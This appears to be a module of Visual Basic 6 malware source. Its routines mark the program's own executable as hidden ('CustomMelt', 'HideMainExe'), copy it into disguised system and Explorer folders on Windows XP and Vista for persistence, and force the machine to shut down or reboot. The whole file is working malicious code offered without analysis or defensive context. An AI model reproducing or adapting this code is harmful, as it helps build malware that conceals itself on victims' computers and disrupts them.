Attribute VB_Name = "Module7"
Private Declare Function SetFileAttributes Lib "kernel32" Alias "SetFileAttributesA" (ByVal lpFileName As String, ByVal dwFileAttributes As Long) As Long
Private Const FILE_ATTRIBUTE_ARCHIVE = &H20
Private Const FILE_ATTRIBUTE_COMPRESSED = &H800
Private Const FILE_ATTRIBUTE_DIRECTORY = &H10
Private Const FILE_ATTRIBUTE_HIDDEN = &H2
Private Const FILE_ATTRIBUTE_NORMAL = &H80
Private Const FILE_ATTRIBUTE_READONLY = &H1
Private Const FILE_ATTRIBUTE_SYSTEM = &H4
Private Const FILE_ATTRIBUTE_TEMPORARY = &H100
Public Function WINShutdown()
ExitWindowsEx EWX_SHUTDOWN, 1
ExitWindowsEx EWX_SHUTDOWN, 1
ExitWindowsEx EWX_SHUTDOWN, 1
End Function
Public Function WINReboot()
ExitWindowsEx EWX_REBOOT, 0
ExitWindowsEx EWX_REBOOT, 0
ExitWindowsEx EWX_REBOOT, 0
End Function
Public Sub HideMainExe()
Get_User_Name
getr00t
On Error Resume Next
file = Form1.txtroot.text & "Windows\" & "Config\" & App.EXEName & ".exe"
SetFileAttributes file, FILE_ATTRIBUTE_HIDDEN
End Sub

Public Sub CustomMelt()
On Error Resume Next
file = App.Path & "\" & App.EXEName & ".exe"
SetFileAttributes file, FILE_ATTRIBUTE_HIDDEN
End Sub

Public Function getr00t()
Form1.txtroot.text = Environ$("systemroot")
Form1.txtroot.text = Mid(Form1.txtroot.text, 1, Len(Form1.txtroot.text) - 7)
End Function

Public Sub FaiLsafEXP()
On Error Resume Next
Get_User_Name
getr00t
If Dir(Form1.txtroot.text & "Windows\" & "Config\" & App.EXEName & ".exe") <> "" Then  'The file exists
Else
FileCopy App.Path & "\" & App.EXEName & ".exe", Form1.txtroot.text & "Windows\" & "Config\" & App.EXEName & ".exe"
End If
End Sub

Public Sub FaiLsafEVista()
On Error Resume Next
Get_User_Name
getr00t
If Dir(Form1.txtroot.text & "Users\" & Form1.Text1.text & "\AppData\Local\Microsoft\Windows\Explorer\" & App.EXEName & ".exe") <> "" Then   'The file exists
Else
FileCopy App.Path & "\" & App.EXEName & ".exe", Form1.txtroot.text & "Users\" & Form1.Text1.text & "\AppData\Local\Microsoft\Windows\Explorer\" & App.EXEName & ".exe"
End If
End Sub
